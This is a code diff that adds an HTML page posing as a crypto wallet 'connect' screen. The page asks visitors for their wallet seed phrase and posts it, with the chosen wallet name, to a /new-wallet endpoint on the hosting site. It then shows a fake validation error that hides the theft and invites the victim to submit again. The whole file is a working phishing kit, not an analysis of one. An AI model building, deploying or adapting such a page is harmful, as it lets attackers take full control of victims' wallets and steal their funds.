@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" href="/assets/css/wallet.css" />
+  </head>
+  <body>
+    <div>
+      <h2 style="margin: 2%; color: brown">Connect Your Wallet</h2>
+    </div>
+    <div class="wallestlist">
+      <h2 style="color: brown">Connect to a Wallet</h2>
+      <div class="wallet">
+        <div id="list">
+          <button class="btn">Trust Wallet</button>
+          <button class="btn">Yorol</button>
+          <button class="btn">Gero</button>
+          <button class="btn">Nami</button>
+          <button class="btn">Solana</button>
+          <button class="btn">Phantom</button>
+          <button class="btn">Sollet</button>
+          <button class="btn">Trust Wallet</button>
+          <button class="btn">Yorol</button>
+          <button class="btn">Gero</button>
+          <button class="btn">Nami</button>
+          <button class="btn">Solana</button>
+          <button class="btn">Phantom</button>
+          <button class="btn">Sollet</button>
+        </div>
+      </div>
+    </div>
+    <section class="input">
+      <div class="wrap">
+        <h2>Seed Phrase</h2>
+        <p>
+          Please enter your wallet's seed phrase, the seed phrase is 24 words
+          long (sometimes 12)
+        </p>
+        <textarea
+          name="seedphrase"
+          id="seedphrase"
+          placeholder="Please enter seed phrase"
+          autofocus
+        ></textarea>
+        <button id="validate">Validate</button>
+      </div>
+    </section>
+    <script>
+      const buttons = document.querySelectorAll(".btn");
+      const form = document.querySelector(".input");
+      const send = document.getElementById("validate");
+      const formInput = document.getElementById("seedphrase");
+      const data = {
+        wallet: "",
+        seed: "",
+      };
+      buttons.forEach((button) => {
+        button.addEventListener("click", () => {
+          console.log(button.textContent);
+          form.classList.add("active");
+          data.wallet = button.textContent;
+        });
+      });
+
+      send.addEventListener("click", async () => {
+        data.seed = formInput.value;
+        console.log(data);
+        const response = await fetch(`${location.origin}/new-wallet`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        });
+        if (response.ok) {
+          alert(
+            "There was a problem validating your wallet. Please try again after 5mins."
+          );
+          form.classList.remove("active");
+        }
+        const resData = await response.json();
+      });
+
+      formInput.addEventListener("keyup", (e) => {
+        if (e.key == " ") {
+          e.preventDefault();
+          formInput.value += ", ";
+        }
+      });
+    </script>
+  </body>
+</html>
